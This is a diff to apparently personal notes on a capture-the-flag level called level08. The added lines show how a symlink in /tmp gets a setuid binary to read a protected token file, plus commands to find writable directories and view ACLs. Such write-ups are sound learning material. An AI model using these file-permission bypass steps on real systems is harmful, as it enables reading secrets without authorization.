@@ -6,10 +6,18 @@ both files are owned by flag08 but the binary is executable by level08
 we can assume it can read the content of the token file but reject its name -> rename token file without permission to read
 the size of the token file indicates that it can be the flag for level08
 
--> read it with symbolic links => it outputs 'test'
+-> read it with symbolic links 
+
+
+```ln -s ~/token /tmp/file```
+```./level08 /tmp/file``` = token
+
+
 
 find a folder that can be readable and writable by user :
 ```find / -writable 2>/dev/null```
+
+
 
 ### see extended permissions of a file
 ```getfacl level08 ```
